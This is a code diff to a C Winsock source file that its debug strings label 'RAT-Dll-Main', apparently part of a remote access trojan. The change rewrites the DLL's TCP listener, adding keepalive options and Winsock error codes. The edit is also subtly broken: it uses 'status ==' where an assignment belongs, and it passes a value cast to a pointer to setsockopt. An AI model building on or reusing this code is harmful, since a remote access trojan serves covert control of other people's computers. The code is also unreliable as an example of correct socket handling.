@@ -14,6 +14,8 @@ INT startListen()
     INT status = SUCCESS;
     INT sendStatus = 0;
     INT recvBufLen = DEFAULT_BUF_LEN;
+    INT bOptLen = sizeof(BOOL);
+    BOOL bOptVal = FALSE;
     CHAR recvBuf[DEFAULT_BUF_LEN];
     CHAR msgBuf[DEFAULT_BUF_LEN];
 
@@ -36,22 +38,32 @@ INT startListen()
     // Accept any IP address
     client.sin_addr.s_addr = htonl(INADDR_ANY);
     clientSock = INVALID_SOCKET;
-    serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
+    serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (serverSock == INVALID_SOCKET)
     {
         OutputDebugStringA("RAT-Dll-Main::startListen - Failed to create socket! \n");
-        status = FAILURE;
+        status = WSAGetLastError();
         goto cleanup;
     }
 
-    if (bind(serverSock, (LPSOCKADDR)&client, sizeof(client)) == SOCKET_ERROR)
+    status = bind(serverSock, (LPSOCKADDR)&client, sizeof(client));
+    if (status == SOCKET_ERROR)
     {
         OutputDebugStringA("RAT-Dll-Main::startListen - Failed to bind to socket! \n");
-        status = FAILURE;
+        status = WSAGetLastError();
+        goto cleanup;
+     }
+
+    // Set keepalive for our server socket
+    status == setsockopt(serverSock, SOL_SOCKET, SO_KEEPALIVE, (char*)bOptVal, bOptLen);
+    if (status == SOCKET_ERROR)
+    {
+        OutputDebugStringA("RAT-Dll-Main::startListen - Failed to set keepalive options! \n");
+        status = WSAGetLastError();
         goto cleanup;
     }
-
+        
     sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Listening on port %u\n", PORT_NUM);
     OutputDebugStringA(msgBuf);
 
